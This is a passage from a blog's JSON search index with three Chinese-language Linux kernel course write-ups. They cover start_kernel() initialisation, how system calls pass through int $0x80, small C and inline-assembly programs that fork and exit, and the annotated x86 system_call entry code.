PAGE_SHIFT); initrd_start = 0; } #endif vfs_caches_init_early(); //前期虚拟文件系统(vfs)的缓存初始化 mem_init(); //初始化内存并计算可用内存大小;标记哪些内存可以使用，并且告诉系统有多少内存可以使用，当然是除了内核使用的内存以外 kmem_cache_init(); // 初始化SLAB缓存分配器 setup_per_cpu_pageset(); numa_policy_init(); if (late_time_init) late_time_init(); calibrate_delay(); pidmap_init(); //进程号位图初始化，一般用一个page来指示所有的进程PID占用情况 pgtable_cache_init(); prio_tree_init(); //初始化内核基于radix树的优先级搜索树(PST)，初始化结构体 anon_vma_init(); //初始化反向映射的匿名内存，提供反向查找内存的结构指针位置，快速地回收内存。 #ifdef CONFIG_X86 if (efi_enabled) efi_enter_virtual_mode(); #endif fork_init(num_physpages); //初始化kernel的fork()环境。Linux下应用程序执行是靠系统调用fork()完成，fork_init所完成的工作就是确定可以fork()的线程的数量，然后是初始化init_task进程 proc_caches_init(); //进程缓存初始化，为进程初始化创建机制所需的其他数据结构申请空间 buffer_init(); //初始化文件系统的缓冲区，并计算最大可以使用的文件缓存。 unnamed_dev_init(); //初始化一个虚拟文件系统使用的哑文件 key_init(); //没有键盘则为空，如果有键盘，则为键盘分配一个高速缓存 security_init(); vfs_caches_init(num_physpages); //初始化虚拟文件系统 radix_tree_init(); signals_init(); //初始化内核信号队列…. page_writeback_init(); //页面写机制初始化 #ifdef CONFIG_PROC_FS proc_root_init(); //初始化系统进程文件系统，主要提供内核与用户进行交互的平台，方便用户实时查看进程的信息。 #endif cpuset_init(); //初始化CPUSET，CPUSET主要为控制组提供CPU和内存节点的管理的结构。 check_bugs(); //检查CPU配置、FPU等是否非法使用不具备的功能，检查CPU BUG，软件规避BUG acpi_early_init(); /* before LAPIC and SMP init */ rest_init(); //最后实际进入reset_init()函数，包括所有剩下的硬件驱动，线程初始化等过程…这也最终完成start_kernel的启动过程。 }\u0026lt;/span\u0026gt;  接下来分析init进程的创建和执行： start_kernel() -\u0026gt; rest_init() -\u0026gt; kernel_init() -\u0026gt; 启动init进程;\nrest_init函数中创建的一个内核线程kernel_init，调用该内核线程之后，该线程要完成的任务是启动init进程，也就是我们所谓的１号进程，是系统启动后的第一个进程。大致可如下表示： 0号进程(rest_init)-\u0026gt;1号内核进程（kernel_init）-\u0026gt;1号用户进程（init进程） 同时０号进程rest_init中最后会调用一个idle的进程，idle进程是在系统中没有任何任务执行的时候，该任务开始工作。\n实验：内核调试 ","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"d20ffec379ce9d586a2719451d126908","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Start-Kernel-Function/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Start-Kernel-Function/","section":"post","summary":"Linux内核课第三周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程3_start_kernel()函数分析","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第四周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n主要内容：\n Linux系统调用的原理 系统调用的实现与意义 API和系统调用 系统调用程序及服务例程 实验：使用C语言和汇编分别进行系统调用  Linux系统调用的原理 系统调用，顾名思义，说的是操作系统提供给用户程序调用的一组“特殊”接口。用户程序可以通过这组“特殊”接口来获得操作系统内核提供的服务，比如用户可以通过文件系统相关的调用请求系统打开文件、关闭文件或读写文件，可以通过时钟相关的系统调用获得系统时间或设置定时器等。\n从逻辑上来说，系统调用可被看成是一个内核与用户空间程序交互的接口——它好比一个中间人，把用户进程的请求传达给内核，待内核把请求处理完毕后再将处理结果送回给用户空间。\n系统服务之所以需要通过系统调用来提供给用户空间的根本原因是为了对系统进行“保护”，因为我们知道Linux的运行空间分为内核空间与用户空间，它们各自运行在不同的级别中，逻辑上相互隔离。所以用户进程在通常情况下不允许访问内核数据，也无法使用内核函数，它们只能在用户空间操作用户数据，调用用户空间函数。比如我们熟悉的“hello world”程序（执行时）就是标准的用户空间进程，它使用的打印函数printf就属于用户空间函数，打印的字符“hello word”字符串也属于用户空间数据。\n但是很多情况下，用户进程需要获得系统服务（调用系统程序），这时就必须利用系统提供给用户的“特殊接口”——系统调用了，它的特殊性主要在于规定了用户进程进入内核的具体位置；换句话说，用户访问内核的路径是事先规定好的，只能从规定位置进入内核，而不准许肆意跳入内核。有了这样的陷入内核的统一访问路径限制才能保证内核安全无虞。我们可以形象地描述这种机制：作为一个游客，你可以买票要求进入野生动物园，但你必须老老实实地坐在观光车上，按照规定的路线观光游览。当然，不准下车，因为那样太危险，不是让你丢掉小命，就是让你吓坏了野生动物。\n该段引用自博客： Linux系统调用\n系统调用的实现和意义 Linux系统调用是通过软中断来实现的，软中断是有编程人员在软件中进行触发的（注意区别与硬件中断）；在代码中的体现是通过int $0x80汇编指令来触发编程异常；\n那为什么要弄一个异常机制呢？ 因为当用户态的进程调用一个系统调用时，CPU便被切换到内核态执行内核函数，而我们在i386体系结构部分已经讲述过了进入内核——进入高特权级别——必须经过系统的门机制，这里的异常实际上就是通过系统门陷入内核。\n详细地解释一下这个过程。int $0x80指令的目的是产生一个编号为0x80的编程异常，这个编程异常对应的是中断描述符表IDT中的第128项——也就是对应的系统门描述符。门描述符中含有一个预设的内核空间地址，它指向了系统调用处理程序：system_call()（别和系统调用服务程序混淆,这个程序在entry.S文件中用汇编语言编写）。\n很显然，所有的系统调用都会统一地转到这个地址，但Linux一共有256系统调用都从这里进入内核后又该如何派发到它们到各自的服务程序去呢？\n解决这个问题的方法非常简单：首先Linux为每个系统调用都进行了编号（0—NR_syscall），同时在内核中保存了一张系统调用表，该表中保存了系统调用编号和其对应的服务例程，因此在系统调入通过系统门陷入内核前，需要把系统调用号一并传入内核，在x86上，这个传递动作是通过在执行int0x80前把调用号装入eax寄存器实现的。这样系统调用处理程序一旦运行，就可以从eax中得到数据，然后再去系统调用表中寻找相应服务例程了。\n那么，调用时候的参数是如何传递的呢？\n传递的参数主要有：\n 实际的值； 用户态进程地址空间的变量的地址； 甚至是包含指向用户态函数的指针的数据结构的地址；  寄存器传递参数具有如下限制：\n 每个参数的长度不能超过寄存器的长度，即32位 在系统调用号（eax）之外，参数的个数不能超过6个（ebx，ecx，edx，esi，edi，ebp）  超过6个怎么办？超过６个的话，可将其放到内存中，把内存地址传递过去即可； 系统调用过程如下所示： 总结：系统调用，简而言之，就是软件通过调用API，由API调用int $0x80 触发软件中断，然后通过一些寄存器将参数传入，实现一些硬件的操作。\n那设置系统调用的意义何在呢？\n操作系统为用户态进程与硬件设备进行交互提供了一组接口——系统调用\n 把用户从底层的硬件编程中解放出来 极大的提高了系统的安全性 使用户程序具有可移植性  API，系统调用，系统命令，内核函数 应用编程接口(application program interface, API)是一个函数定义，说明了如何获得一个给定的服务，比如read( )、malloc( )、free( )、abs( )等。它有可能和系统调用形式上一致，比如read()接口就和read系统调用对应，但这种对应并非一一对应，往往会出现几种不同的API内部用到同一个系统调用，比如malloc( )、free( )内部利用brk( )系统调用来扩大或缩小进程的堆；或一个API利用了好几个系统调用组合完成服务。更有些API甚至不需要任何系统调用——因为它并不是必需要使用内核服务，如计算整数绝对值的abs（）接口\n系统调用并非直接和程序员或系统管理员打交道，它仅仅是一个通过软中断机制（我们后面讲述）向内核提交请求，获取内核服务的接口。\n系统命令，就是可以执行的一些程序，利用了现有的一些API来实现特定的常用功能。\n内核函数，听着很高大上，其实它们和普通函数很像，但不对用户展现，系统自己使用的一些函数，在内核实现，因此要满足一些内核编程的要求。而系统调用是一层用户进入内核的接口，它本身并非内核函数，进入内核后，不同的系统调用会找到对应到各自的内核函数——换个专业说法就叫：系统调用服务例程。实际上针对请求提供服务的是内核函数而非调用接口。\n系统调用程序和服务例程 上面提到Linux只允许系统调用接口使用128这一个软中断向量，这也就意味着所有的系统调用接口必须共享这一个中断通道，并在同一个中断服务例程中（这里的中断服务例程就是对应于中断号为128的中断服务例程，通过查中断向量表得到）调用不同的内核服务例程，所以，系统调用接口除了要引发“int ＄ Ox80”软中断之外，为了进人内核后能调用不同的内核服务例程，还要提供识别内核服务例程的参数，这个参数叫做“系统调用号”。也就是说，所有可为进程提供服务的内核服务例程都应具有一个唯一的系统调用号。当然，系统调用接口还应为内核服务例程准各必要的参数。\n那么，这里，我就截一个系统调用表的图片给大家看看：\n在图中我们可以看到，我们的系统调用表格中的第一个调用是sys_restart_syscall,也就是重启了，系统为每一个系统调用都定义了一个唯一的编号，同时在内核中保存了一张系统调用表，该表中保存了系统调用编号和其对应的服务例程地址，第呢n个表项包含了系统调用号为n的服务例程的地址；\n所有系统调用陷入内核前，需要将系统调用号一起传入内核，而该标号实际上就是系统调用表的下标，在i386上，这个传递工作是通过在执行int $0x80前把调用号装入eax寄存器来实现的，这样系统调用处理程序一旦运行起来，就可以从eax中得到系统调用号，然后再到系统调用表中去寻找相应的服务例程。\n整理系统调用的过程：\n 应用程序调用封装好的API 要保护用户态的现场，即把处理器的用户态运行环境保护到进程的内核堆栈。 API将对应的系统调用号存入eax，如果需要传参，还要在其他寄存器中传入相关参数，然后调用int $0x80触发中断进入内核中的中断处理函数 内核中的中断处理程序根据系统调用号调用对应的系统调用 系统完成相应功能，将返回值存入eax，返回到中断处理函数； 中断处理函数返回到API中;//在返回的途中，有进程调度，如果有优先级更高的进程，会调度 API将eax，即系统调用的返回值返回给应用程序。  实验：使用C语言和汇编分别进行系统调用 在这里，使用的系统调用中的exit()来进行系统调用实践，下面是C语言程序，主要的功能是父进程fork()一个子进程，然后子进程沉睡５秒钟后僵死，父进程等待子进程退出之后回收子进程。\n\u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt;/*************************************************************************\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\t\u0026gt; File Name: Callexit.c \u0026gt; Author: GuoZe Tang \u0026gt; Mail: 269831714@qq.com \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; ************************************************************************/\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;\t\u0026gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; printf(\u0026quot;Fork error!\\n\u0026quot;);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;#include\u0026lt;unistd.h\u0026gt; int main(int argc,char *argvs) { pid_t pc,pr; int t; pc =fork(); if(pc \u0026lt; 0) \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; pr=wait(NULL);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; else if(pc == 0){ printf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid()); sleep(5); } else{ \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt;}\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt; printf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr); } \u0026lt;div style=\u0026quot;text-align: justify;\u0026quot;\u0026gt;\u0026lt;span style=\u0026quot;font-family: Arial, Helvetica, sans-serif;\u0026quot;\u0026gt; exit(0);\u0026lt;/span\u0026gt;\u0026lt;/div\u0026gt;  执行结果如下图所示，很简单：\n进程的退出，调用系统调用exit（）就可完成，在这里exit写出汇编的形式，查询系统调用表，可知exit的系统调用号为１；使用汇编代码来书写exit系统调用如下：\n/************************************************************************* \u0026gt; File Name: Callexit_asm.c \u0026gt; Author: GuoZe Tang \u0026gt; Mail: 269831714@qq.com \u0026gt; Created Time: Sun 29 Mar 2015 01:08:06 PM CST ************************************************************************/ #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;time.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt; #include\u0026lt;unistd.h\u0026gt; int main(int argc,char *argvs) { pid_t pc,pr; int t; pc =fork(); if(pc \u0026lt; 0) printf(\u0026quot;Fork error!\\n\u0026quot;); else if(pc == 0){ printf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid()); sleep(5); } else{ pr=wait(NULL); printf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr); } asm volatile( \u0026quot;mov $0x1,%%eax\\n\\t\u0026quot; \u0026quot;mov $0x0,%%ebx\\n\\t\u0026quot; \u0026quot;int $0x80\\n\\t\u0026quot; \u0026quot;mov %%eax,%0\\n\\t\u0026quot; :\u0026quot;=m\u0026quot; (t) ); }  执行如下：\n","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"7940b41f0dc3080810067196a4b0d9c8","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-system-call/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-system-call/","section":"post","summary":"Linux内核课第四周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程4_Linux系统调用","type":"post"},{"authors":null,"categories":"Linux","content":"Linux内核课第五周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n 中断处理的主要内容：\n 调试sys_exit() 系统调用源代码分析 系统调用小结  加入自定义的系统调用CallExit. 修改menu/test.c文件，加入自己定义的系统调用函数。\n#include \u0026lt;stdio.h\u0026gt;\r#include \u0026lt;stdlib.h\u0026gt;\r#include \u0026lt;time.h\u0026gt;\r#include \u0026quot;menu.h\u0026quot;\r#include\u0026lt;sys/types.h\u0026gt;\r#include\u0026lt;unistd.h\u0026gt;\r#define FONTSIZE 10\r......\r......\rint CallExit(int argc,char *argvs)\r{\rpid_t pc,pr;\rint t;\rpc =fork();\rif(pc \u0026lt; 0)\rprintf(\u0026quot;Fork error!\\n\u0026quot;);\relse if(pc == 0){\rprintf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid());\rsleep(5);\r}\relse{\rpr=wait(NULL);\rprintf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr);\r}\rexit(0);\r}\rint CallExit_asm(int argc,char *argvs)\r{\rpid_t pc,pr;\rint t;\rpc =fork();\rif(pc \u0026lt; 0)\rprintf(\u0026quot;Fork error!\\n\u0026quot;);\relse if(pc == 0){\rprintf(\u0026quot;This is child process with pid of %d\\n\u0026quot;,getpid());\rsleep(5);\r}\relse{\rpr=wait(NULL);\rprintf(\u0026quot;I catched a child process with pid of %d\\n\u0026quot;,pr);\r}\rasm volatile(\r\u0026quot;mov $0x1,%%eax\\n\\t\u0026quot;\r\u0026quot;mov $0x0,%%ebx\\n\\t\u0026quot;\r\u0026quot;int $0x80\\n\\t\u0026quot;\r\u0026quot;mov %%eax,%0\\n\\t\u0026quot;\r:\u0026quot;=m\u0026quot; (t)\r);\r}\rint main()\r{\rPrintMenuOS();\rSetPrompt(\u0026quot;MenuOS\u0026gt;\u0026gt;\u0026quot;);\rMenuConfig(\u0026quot;version\u0026quot;,\u0026quot;MenuOS V1.0(Based on Linux 3.18.6)\u0026quot;,NULL);\rMenuConfig(\u0026quot;quit\u0026quot;,\u0026quot;Quit from MenuOS\u0026quot;,Quit);\rMenuConfig(\u0026quot;time\u0026quot;,\u0026quot;Show System Time\u0026quot;,Time);\rMenuConfig(\u0026quot;time-asm\u0026quot;,\u0026quot;Show System Time(asm)\u0026quot;,TimeAsm);\r**MenuConfig(\u0026quot;CallExit\u0026quot;,\u0026quot;Exit Systemcall\u0026quot;,CallExit);**\r**MenuConfig(\u0026quot;CallExit_asm\u0026quot;,\u0026quot;Exit_asm Systemcall\u0026quot;,CallExit_asm);**\rExecuteMenu();\r}\r 即在main函数中，加入相应的系统调用定义，讲CallExit和CallExit_asm加入到其中去，在QEMU中启动系统之后可以输入help看到，我们的命令中多了两条命令。\n可惜在进行系统调用测试的时候出现了问题，导致系统崩溃了，暂时还没有测试出来代码中是什么地方出现了问题，会继续调试找出问题的地方。\n关于老师视频中提到的不能调试sys_time的一些分析：\nLinux Kernel代码艺术——系统调用宏定义\n可以参考这一篇文章中的内容，在2.6.28之前的内核代码中，系统调用的时候是直接调用处理函数的，但出现了漏洞CVE-2009-0029漏洞之后，就是通过宏定义的方式来处理系统调用函数了。\n 系统调用源代码分析 # system call handler stub\rENTRY(system_call) //所有系统调用函数的入口处\rRING0_INT_FRAME # can't unwind into user space anyway\rASM_CLAC\rpushl_cfi %eax # 保存系统调用号\rSAVE_ALL # 保护现场\rGET_THREAD_INFO(%ebp)　#保存当前信息到ebp中\r# system call tracing in operation / emulation\rtestl $_TIF_WORK_SYSCALL_ENTRY,TI_flags(%ebp)\rjnz syscall_trace_entry\r##判断是否是trace相关的调用\r##判断系统调用号是否超出了最大值255\rcmpl $(NR_syscalls), %eax\rjae syscall_badsys\rsyscall_call:\rcall *sys_call_table(,%eax,4) //由系统调用表中的对应系统调用号找服务函数\rsyscall_after_call:\rmovl %eax,PT_EAX(%esp) # store the return value\r#系统调用返回\rsyscall_exit:　LOCKDEP_SYS_EXIT\rDISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt\r# setting need_resched or sigpending\r# between sampling and the iret\rTRACE_IRQS_OFF\rmovl TI_flags(%ebp), %ecx\r##退出系统调用之前，检查是否需要处理信号\rtestl $_TIF_ALLWORK_MASK, %ecx # current-\u0026gt;work\rjne syscall_exit_work\r#恢复处理器工作\rrestore_all:\rTRACE_IRQS_IRET\rrestore_all_notrace:\r#ifdef CONFIG_X86_ESPFIX32\rmovl PT_EFLAGS(%esp), %eax # mix EFLAGS, SS and CS\r# Warning: PT_OLDSS(%esp) contains the wrong/random values if we\r# are returning to the kernel.\r# See comments in process.c:copy_thread() for details.\rmovb PT_OLDSS(%esp), %ah\rmovb PT_CS(%esp), %al\randl $(X86_EFLAGS_VM | (SEGMENT_TI_MASK \u0026lt;\u0026lt; 8) | SEGMENT_RPL_MASK), %eax\rcmpl $((SEGMENT_LDT \u0026lt;\u0026lt; 8) | USER_RPL), %eax\rCFI_REMEMBER_STATE\rje ldt_ss # returning to user-space with LDT SS\r#endif\rrestore_nocheck:\rRESTORE_REGS 4 # skip orig_eax/error_code\rirq_return:\rINTERRUPT_RETURN　//中断系统调用的处理过程，结束点iret\r.section .fixup,\u0026quot;ax\u0026quot;\rENTRY(iret_exc)\rpushl $0 # no error code\rpushl $do_iret_error\rjmp error_code\r.previous\r_ASM_EXTABLE(irq_return,iret_exc)\r#ifdef CONFIG_X86_ESPFIX32\rCFI_RESTORE_STATE\rldt_ss:\r#ifdef CONFIG_PARAVIRT\rcmpl $0, pv_info+PARAVIRT_enabled\rjne restore_nocheck\r#endif\r#define GDT_ESPFIX_SS PER_CPU_VAR(gdt_page) + (GDT_ENTRY_ESPFIX_SS * 8)\rmov %esp, %edx /* load kernel esp */\rmov PT_OLDESP(%esp), %eax /* load userspace esp */\rmov %dx, %ax /* eax: new kernel esp */\rsub %eax, %edx /* offset (low word is 0) */\rshr $16, %edx\rmov %dl, GDT_ESPFIX_SS + 4 /* bits 16..23 */\rmov %dh, GDT_ESPFIX_SS + 7 /* bits 24..31 */\rpushl_cfi $__ESPFIX_SS\rpushl_cfi %eax /* new kernel esp */\r/* Disable interrupts, but do not irqtrace this section: we\r* will soon execute iret and the tracer was already set to\r* the irqstate after the iret */\rDISABLE_INTERRUPTS(CLBR_EAX)\rlss (%esp), %esp /* switch to espfix segment */\rCFI_ADJUST_CFA_OFFSET -8\rjmp restore_nocheck\r#endif\rCFI_ENDPROC\rENDPROC(system_call)\r# perform work that needs to be done immediately before resumption\rALIGN\rRING0_PTREGS_FRAME # can't unwind into user space anyway\rwork_pending:\rtestb $_TIF_NEED_RESCHED, %cl #检查是否需要重新调度\rjz work_notifysig　#不需要重新调度，调到work_notifysig\rwork_resched: #重新调度\rcall schedule #进程调度\rLOCKDEP_SYS_EXIT\rDISABLE_INTERRUPTS(CLBR_ANY) # make sure we don't miss an interrupt\r# setting need_resched or sigpending\r# between sampling and the iret\rTRACE_IRQS_OFF\rmovl TI_flags(%ebp), %ecx\randl $_TIF_WORK_MASK, %ecx # is there any work to be done other\r# than syscall tracing?\rjz restore_all　//没有其余事情，则恢复现场\rtestb $_TIF_NEED_RESCHED, %cl\rjnz work_resched\rwork_notifysig: # deal with pending signals and\r# notify-resume requests\r#ifdef CONFIG_VM86\rtestl $X86_EFLAGS_VM, PT_EFLAGS(%esp)\rmovl %esp, %eax\rjne work_notifysig_v86 # returning to kernel-space or\r# vm86-space\r1:\r#else\rmovl %esp, %eax\r#endif\rTRACE_IRQS_ON\rENABLE_INTERRUPTS(CLBR_NONE)\rmovb PT_CS(%esp), %bl\randb $SEGMENT_RPL_MASK, %bl\rcmpb $USER_RPL, %bl\rjb resume_kernel\rxorl %edx, %edx\rcall do_notify_resume　#进行信号处理\rjmp resume_userspace\r#ifdef CONFIG_VM86\rALIGN\rwork_notifysig_v86:\rpushl_cfi %ecx # save ti_flags for do_notify_resume\rcall save_v86_state # %eax contains pt_regs pointer\rpopl_cfi %ecx\rmovl %eax, %esp\rjmp 1b\r#endif\rEND(work_pending)\r# perform syscall exit tracing\rALIGN\rsyscall_trace_entry:\rmovl $-ENOSYS,PT_EAX(%esp)\rmovl %esp, %eax\rcall syscall_trace_enter\r/* What it returned is what we'll actually use. */\rcmpl $(NR_syscalls), %eax\rjnae syscall_call\rjmp syscall_exit\rEND(syscall_trace_entry)\r# perform syscall exit tracing\rALIGN\rsyscall_exit_work: #完成其他工作\rtestl $_TIF_WORK_SYSCALL_EXIT, %ecx\r#检查是否系统调用跟踪,审计,单步执行,不需要则跳到work_pending(进行调度,信号处理) jz work_pending\rTRACE_IRQS_ON\rENABLE_INTERRUPTS(CLBR_ANY) # could let syscall_trace_leave() call\r# schedule() instead\rmovl %esp, %eax\rcall syscall_trace_leave\rjmp resume_userspace\rEND(syscall_exit_work)\rCFI_ENDPROC\rRING0_INT_FRAME # can't unwind into user space anyway\rsyscall_fault:\rASM_CLAC\rGET_THREAD_INFO(%ebp)\rmovl $-EFAULT,PT_EAX(%esp)\rjmp resume_userspace\rEND(syscall_fault)\rsyscall_badsys:\rmovl $-ENOSYS,%eax\rjmp syscall_after_call\rEND(syscall_badsys)\rsysenter_badsys:\rmovl $-ENOSYS,%eax\rjmp sysenter_after_call\rEND(sysenter_badsys)\rCFI_ENDPROC\r.macro FIXUP_ESPFIX_STACK\r/*\r* Switch back for ESPFIX stack to the normal zerobased stack\r*\r* We can't call C functions using the ESPFIX stack. This code reads\r* the high word of the segment base from the GDT and swiches to the\r* normal stack and adjusts ESP with the matching offset.\r*/\r#ifdef CONFIG_X86_ESPFIX32\r/* fixup the stack */\rmov GDT_ESPFIX_SS + 4, %al /* bits 16..23 */\rmov GDT_ESPFIX_SS + 7, %ah /* bits 24..31 */\rshl $16, %eax\raddl %esp, %eax /* the adjusted stack pointer */\rpushl_cfi $__KERNEL_DS\rpushl_cfi %eax\rlss (%esp), %esp /* switch to the normal stack segment */\rCFI_ADJUST_CFA_OFFSET -8\r#endif\r.endm\r.macro UNWIND_ESPFIX_STACK\r SAVE_ALL保存现场函数的宏定义如下图所示：\n 系统调用小结 系统调用流程小结：\n 执行用户程序(如:fork,exit) 根据glibc中的函数实现，取得系统调用号并执行int $0x80产生中断。 进行地址空间的转换和堆栈的切换，执行SAVE_ALL。（进行内核模式） 进行中断处理，根据系统调用表调用内核函数。 执行内核函数。 执行RESTORE_ALL并返回用户模式  类似中断处理过程，可以知道，在中断当中这个整体的框架是不变化的的，只是相应的系统调用号和处理函数之间的转化变化成了中断号和中断处理函数之间的转化。\nst=\u0026gt;start: int0x80-\u0026gt;ENTRY(system_call)\re=\u0026gt;end: Ende|future:\u0026gt;http://www.google.com\rop1=\u0026gt;operation: SAVE_ALL(保存现场)|past\rop2=\u0026gt;operation: call *sys_call_table\rop3=\u0026gt;operation: 系统调用处理程序将返回值存入eax\rcond1=\u0026gt;condition: 是否有其他信号或调度\rio=\u0026gt;inputoutput: 处理其他信号|future\rcond2=\u0026gt;condition: 是否有调度信号\rop4=\u0026gt;operation: call_schedule（进程调度）\rop5=\u0026gt;operation: RESTORE_ALL(恢复现场)\rop6=\u0026gt;operation: INTRRRUPT_RET(iret)\r返回用户进程\rop7=\u0026gt;operation: 保存中断，调用上下文，调度\rop8=\u0026gt;operation: 未来再调度回来\rcond3=\u0026gt;condition: 是否有退出信号\rst-\u0026gt;op1-\u0026gt;op2-\u0026gt;op3-\u0026gt;cond1\rcond1(no,lift)-\u0026gt;op5-\u0026gt;op6\rcond1(yes,right)-\u0026gt;io-\u0026gt;cond3(no)-\u0026gt;cond2(yes)-\u0026gt;op4-\u0026gt;op7-\u0026gt;op8\rop8(right)-\u0026gt;op5\rcond2(no,right)-\u0026gt;op5\r","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"339107ff6b8896c9a8df3f6d35283479","permalink":"http://www.guozet.me/post/Linux-kernel-analysis-interrupt/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-kernel-analysis-interrupt/","section":"post","summary":"Linux内核课第五周作业。本文在云课堂中实验楼完成。\n唐国泽 原创作品转载请注明出处.\n《Linux内核分析》MOOC课程\n","tags":"Linux kernel","title":"Linux内核分析课程5_System call中断处理过程","type":"post"}]